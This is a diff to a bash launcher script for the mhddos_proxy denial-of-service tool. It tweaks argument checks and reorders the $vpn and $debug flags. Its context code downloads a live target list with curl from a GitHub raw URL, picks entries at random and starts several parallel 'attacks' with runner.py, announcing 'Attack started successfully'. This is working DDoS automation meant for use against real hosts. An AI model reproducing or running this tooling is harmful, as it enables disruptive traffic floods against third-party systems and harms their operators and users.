@@ -62,7 +62,7 @@ fi
 rpc="${3:-1000}"
 
 debug="${4:-}"
-if [ "${debug}" != "--debug" ] && [ "${debug}" != "" ] && [ "${debug}" != "--vpn" ] && [ "${debug}" != "--lang EN" ];
+if [ "${debug}" != "--debug" ] && [ "${debug}" != "" ] && [ "${debug}" != "--vpn" ] && [ "${debug}" != "EN" ];
 then
 	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mStarting with parameter --debug (--table is not supported in our script)\033[0;0m\n"
 	debug="--debug"
@@ -217,7 +217,7 @@ do
 		echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Random number(s): " $random_numbers "\n"
 		
 		echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mYou have only $proc_num CPU, so for next 20 minutes will be started only mhddos_proxy (without proxy_finder)\033[0;0m\n"
-		echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[1;32mStarting attack with such parameters: $num_of_copies parallel atack(s) -t $threads --rpc $rpc $debug...\033[1;0m"
+		echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[1;32mStarting attack with such parameters: $num_of_copies parallel atack(s) -t $threads --rpc $rpc $debug $vpn...\033[1;0m"
 		sleep 3s
 		# Launch multiple mhddos_proxy instances with different targets.
    		for i in $random_numbers
@@ -256,7 +256,7 @@ do
 	
 		echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Random number(s): " $random_numbers "\n"
 		
-		echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[1;32mStarting attack(s) with such parameters: $num_of_copies parallel atack(s) -t $threads --rpc $rpc $debug...\033[1;0m"
+		echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[1;32mStarting attack(s) with such parameters: $num_of_copies parallel atack(s) -t $threads --rpc $rpc $debug $vpn...\033[1;0m"
 		sleep 3s
 		# Launch multiple mhddos_proxy instances with different targets.
    		for i in $random_numbers
@@ -266,10 +266,10 @@ do
             		cmd_line=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/alexnest-ua/targets/main/targets_linux | cat | grep "^[^#]")")
            
             		echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - full cmd:\n"
-            		echo "python runner.py $cmd_line --rpc $rpc -t $threads $vpn $debug"
+            		echo "python runner.py $cmd_line --rpc $rpc -t $threads $debug $vpn"
             
             		cd ~/mhddos_proxy
-            		AUTO_MH=1 python runner.py $cmd_line -t $threads --copies $copies $vpn $debug&
+            		AUTO_MH=1 python runner.py $cmd_line -t $threads --copies $copies $debug $vpn&
 	    		sleep 20s
 			echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[42mAttack started successfully\033[0m\n"
 			
